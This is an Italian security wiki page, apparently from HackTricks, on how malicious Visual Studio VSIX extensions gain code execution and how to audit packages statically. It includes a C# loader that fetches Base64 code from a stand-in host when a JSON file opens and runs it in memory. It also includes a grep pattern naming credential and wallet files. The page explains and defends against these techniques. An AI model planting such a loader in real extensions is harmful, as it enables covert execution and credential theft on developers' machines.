# Abuso delle estensioni VSIX di Visual Studio

{{#include ../banners/hacktricks-training.md}}

Un'estensione di Visual Studio può trasformare le normali attività nell'editor in esecuzione di codice con l'identità dell'utente connesso. Un VSIX malevolo, un publisher che si spaccia per un altro o un aggiornamento compromesso dell'estensione possono raggiungere l'utente tramite i normali canali di installazione. L'installazione che richiede una conferma da parte di un amministratore è un percorso di installazione consensuale, non un'escalation automatica dei privilegi.<sup>[[1]](#references)</sup>

## Modello di esecuzione

Le estensioni VSSDK classiche vengono eseguite comunemente all'interno di `devenv.exe`. Il nuovo modello `VisualStudio.Extensibility` esegue principalmente le moderne estensioni .NET out of process: Visual Studio fa da broker per le chiamate a un processo `Microsoft.ServiceHub.Host.Extensibility` dedicato, isolando la stabilità dell'IDE, ma **non** isolando l'estensione dalle autorizzazioni Windows dell'utente. Il nome esatto dell'eseguibile può includere un suffisso relativo all'architettura, come `ServiceHub.Host.Extensibility.arm64.exe`.<sup>[[1]](#references)[[2]](#references)</sup>

### Attivazione durante le normali attività nell'editor

Anziché esporre solo un comando di menu evidente, un'estensione può implementare `ITextViewOpenClosedListener`. Il suo callback `TextViewOpenedAsync` viene invocato per i documenti corrispondenti, mentre `TextViewExtensionConfiguration.AppliesTo` può limitare l'attivazione a un tipo comune, come JSON. Un formatter o un linter legittimo può continuare a svolgere il lavoro dichiarato, mentre una seconda azione viene eseguita come effetto collaterale dell'apertura di un file.<sup>[[1]](#references)[[3]](#references)</sup>

Il seguente schema ridotto mostra i punti di esecuzione importanti; per chiarezza, omette il formatter legittimo e la gestione degli errori.<sup>[[1]](#references)[[3]](#references)</sup>

<details>
<summary>Loader di assembly gestiti in memoria attivato da eventi</summary>

```csharp
[VisualStudioContribution]
internal class JsonListener : ExtensionPart, ITextViewOpenClosedListener
{
    public TextViewExtensionConfiguration TextViewExtensionConfiguration => new()
    {
        AppliesTo = [DocumentFilter.FromDocumentType("json")]
    };

    public async Task TextViewOpenedAsync(ITextViewSnapshot view, CancellationToken ct)
    {
        using var http = new HttpClient();
        var encoded = (await http.GetStringAsync("https://example.invalid/update.txt", ct)).Trim();
        using var stream = new MemoryStream(Convert.FromBase64String(encoded));
        var context = new AssemblyLoadContext(Guid.NewGuid().ToString(), isCollectible: true);
        var entry = context.LoadFromStream(stream).EntryPoint
            ?? throw new InvalidOperationException("Assembly has no entry point");
        var argv = entry.GetParameters().Length == 0 ? null : new object?[] { Array.Empty<string>() };
        if (entry.Invoke(null, argv) is Task task) await task;
        context.Unload();
    }

    public Task TextViewClosedAsync(ITextViewSnapshot view, CancellationToken ct)
        => Task.CompletedTask;
}
```

</details>

Questa catena scarica testo Base64, lo decodifica in byte di assembly, lo carica da un `MemoryStream` tramite un `AssemblyLoadContext` collectible, invoca l'`EntryPoint` riflesso senza parametri o con un `string[]`, attende gli entry point asincroni e scarica il contesto. La seconda fase non viene scritta su disco, anche se il VSIX e la DLL principale dell'estensione restano artefatti su disco. Base64 non offre autenticità né riservatezza; inoltre, l'uso di HTTP consente a un attacker on-path di sostituire la risposta.<sup>[[1]](#references)</sup>

Le varianti operative includono la soppressione di tutte le eccezioni, affinché la funzionalità dichiarata continui a funzionare se lo staging non riesce, oppure l'uso di `ITextViewChangedListener` per attivare il codice dopo le modifiche. Il codice viene eseguito nell'extension host e può usare le API gestite, P/Invoke, file, credenziali e processi figli disponibili per quell'utente.<sup>[[1]](#references)</sup>

Per una superficie di esecuzione correlata e specifica dell'editor, basata sul caricamento automatico di plugin nativi, vedi:

{{#ref}}
windows-local-privilege-escalation/notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Abuso della fiducia nel Marketplace e nella distribuzione

Un VSIX può arrivare come file condiviso direttamente o inviato tramite phishing, dal Marketplace sul web oppure tramite il browser Marketplace integrato in Visual Studio. Una registrazione del publisher che impone principalmente l'unicità e una lista di parole riservate può consentire identità di publisher visivamente suggestive; compromettere un publisher o un'estensione già considerati attendibili è ancora più efficace, perché consente di raggiungere la base utenti che li ha installati. L'installazione dal Marketplace avvia Visual Studio Installer e colloca temporaneamente il VSIX scaricato in `%LOCALAPPDATA%\Temp`; anche `payload.vsix` viene usato legittimamente, quindi il solo nome del file non è un indicatore.<sup>[[1]](#references)</sup>

MDSec non ha identificato un protocollo URL di Visual Studio che installi direttamente un'estensione. L'operatore deve comunque convincere l'utente a installare/considerare attendibile il VSIX oppure compromettere il percorso di distribuzione di un'estensione esistente. Un pacchetto `AllUsers` si installa nella cartella di installazione di Visual Studio e può richiedere l'elevazione, ma si tratta del normale comportamento di un installer con consenso, non di un percorso automatico per ottenere privilegi di amministratore o SYSTEM.<sup>[[1]](#references)[[4]](#references)</sup>

### Audit statico su larga scala

I pacchetti VSIX sono in genere contenitori ZIP, quindi una pipeline sicura per la revisione del Marketplace può enumerare i pacchetti, estrarli **senza caricare il codice delle estensioni**, analizzare i manifest, individuare le superfici eseguibili e decompilare gli assembly gestiti con `ilspycmd`. Assegna la priorità agli assembly appartenenti alle estensioni, escludendo le dipendenze comuni incluse nei pacchetti, quindi correla le stringhe relative agli archivi di credenziali con gruppi di comportamenti come lettura di file e invio in rete, codifica e invio, download ed esecuzione, accesso al gestore credenziali e alla rete oppure acquisizione e invio di screenshot.<sup>[[1]](#references)[[5]](#references)</sup>

```bash
unzip -q sample.vsix -d sample-vsix
find sample-vsix -type f \( -iname '*.dll' -o -iname '*.exe' \) -print
ilspycmd -p -o decompiled sample-vsix/path/to/extension.dll
rg -n -i 'Login Data|logins\.json|key4\.db|wallet\.dat|\.aws[/\\]credentials|LoadFromStream|EntryPoint|cmd\.exe' decompiled
```

Inoltre, esamina le DLL native, i target MSBuild, gli script, i template T4 e i payload degli installer, invece di presumere che ogni superficie di esecuzione sia costituita da codice gestito. Confronta i comportamenti sospetti con lo scopo dichiarato nel manifest: la telemetria e gli updater legittimi possono assomigliare a esfiltrazione o staging. Un'analisi solo statica non rileva codice compresso, offuscato, risolto dinamicamente o dormiente; inoltre, esaminare solo la versione più recente fa perdere di vista eventuali release storiche dannose.<sup>[[1]](#references)</sup>

VS Code utilizza un host delle estensioni e un manifest diversi. Per una share scrivibile che alimenta l'installazione automatizzata di un'estensione di VS Code, vedi [VS Code extension drop-share execution](vscode-extension-abuse.md).

Un attacco distinto basato sul caricamento di un progetto può eseguire un target [MSBuild `GetFrameworkPaths`](visual-studio-project-msbuild-execution.md) dannoso senza installare un VSIX.<sup>[[6]](#references)</sup>

## References

- [1] [MDSec - Estensioni di Visual Studio rivisitate](https://www.mdsec.co.uk/2026/05/visual-studio-extensions-revisited/)
- [2] [Microsoft Learn - Informazioni su VisualStudio.Extensibility](https://learn.microsoft.com/en-us/visualstudio/extensibility/visualstudio.extensibility/visualstudio-extensibility?view=visualstudio)
- [3] [Microsoft Learn - ITextViewOpenClosedListener.TextViewOpenedAsync](https://learn.microsoft.com/en-us/dotnet/api/microsoft.visualstudio.extensibility.editor.itextviewopenclosedlistener.textviewopenedasync?view=vs-extensibility)
- [4] [Microsoft Learn - Anatomia di un pacchetto VSIX](https://learn.microsoft.com/en-us/visualstudio/extensibility/anatomy-of-a-vsix-package?view=visualstudio)
- [5] [ILSpy - Strumento .NET ilspycmd](https://github.com/icsharpcode/ILSpy/blob/master/ICSharpCode.ILSpyCmd/README.md)
- [6] [Unit 42 - La campagna Blinder Tunnel prende di mira le infrastrutture irachene](https://unit42.paloaltonetworks.com/blinder-tunnel-targets-critical-infrastructure/)
{{#include ../banners/hacktricks-training.md}}
